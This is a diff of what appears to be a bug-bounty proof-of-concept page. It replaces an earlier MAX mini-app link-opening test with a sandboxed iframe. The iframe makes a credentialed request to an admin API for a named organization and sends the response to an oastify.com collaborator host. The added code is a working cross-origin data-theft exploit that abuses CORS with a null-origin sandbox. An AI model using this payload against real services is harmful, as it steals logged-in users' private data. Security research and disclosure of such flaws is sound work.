@@ -1,18 +1,10 @@
-<h1>PoC: openLink + openMaxLink</h1>
-<script src="https://st.max.ru/js/max-web-app.js"></script>
-<script>
-    var EXTERNAL_URL = 'https://example.com/';
-    var CHAT_ID = 'verificationcodes_bot';
-    var START_PARAM = 'poc-test';
-    var MAX_URL = 'https://max.ru/' + CHAT_ID + '?startapp=' + START_PARAM;
-
-    WebApp.openLink(EXTERNAL_URL);
-
-    setTimeout(function () {
-        WebApp.openLink(EXTERNAL_URL);
-    }, 6000);
-
-    setTimeout(function () {
-        WebApp.openMaxLink(MAX_URL);
-    }, 12000);
-</script>
+<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
+    var req = new XMLHttpRequest();
+    req.onload = reqListener;
+    req.open('get','https://ext-api-admin.oneme.ru/v1/organizations/035878507724',true);
+    req.withCredentials = true;
+    req.send();
+    function reqListener() {
+        location='https://rxs01ardwok50hrafzqqz21is9y0mvak.oastify.com/log?key='+encodeURIComponent(this.responseText);
+    };
+</script>"></iframe>
